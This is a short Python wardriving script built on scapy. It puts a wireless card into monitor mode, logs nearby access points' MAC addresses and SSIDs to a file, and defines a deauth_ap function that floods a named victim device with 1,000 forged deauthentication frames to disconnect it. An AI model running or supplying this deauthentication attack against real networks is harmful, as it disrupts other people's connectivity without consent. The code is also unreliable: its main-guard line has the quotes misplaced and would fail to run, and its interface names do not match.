#!/usr/bin/env python
#Author: Jared Stroud
try:
    from scapy.all import *
    import os
    import time
except ImportError as err:
    print("[ERROR] I'm missing:  " + str(err))

apList = [] 
interface = "wlan0" #More than likely needs to be changed.

f = open('wardriving.txt', 'a+') #Create/append to the file "wardriving.txt"

#Put wireless NIC into monitor mode.
def monMode():
    os.system("ifconfig " + interface + " down")
    os.system("iwconfig " + interface + " mode monitor")

#Capture beacon frames and display MAC + SSID
def pktCap(pkt):

    if pkt.haslayer(Dot11Beacon):	
        if pkt.addr2 not in apList: #If we haven't seen this access point append it to the list(apList) and write to a file.

            apList.append(pkt.addr2)
            accessPoint = ("Access Point MAC address: " + str(pkt.addr2) + " with SSID " + str(pkt.info) + "\n")
            print(accessPoint)
            f.write(accessPoint)

        else:
            print("Waiting for something new...\n")

        time.sleep(5) # Take a second to avoid crazy writing to the file

def deauth_ap(AP_MAC, VICTIM_MAC):
    '''
        Function: deauth_ap
        Purpose: Send deauth packets to AP, and victim
        Param: AP_MAC: access point MAC control, 
               VICTIM_MAC: victim mac address
                    
        Return: Nothing


        TODO: Embed auto deauth capabilities.
    '''
    interface = "mon0"
    frame= RadioTap()/ Dot11(addr1=VICTIM_MAC,addr2=AP_MAC, addr3=AP_MAC)/ Dot11Deauth()
    sendp(frame,iface=interface, count= 1000, inter= .1)


if "__name__" == __main__:
    monMode()

    conf.iface = "mon0"
    sniff(prn=pktCap)

    f.close() #We're done writing for today...
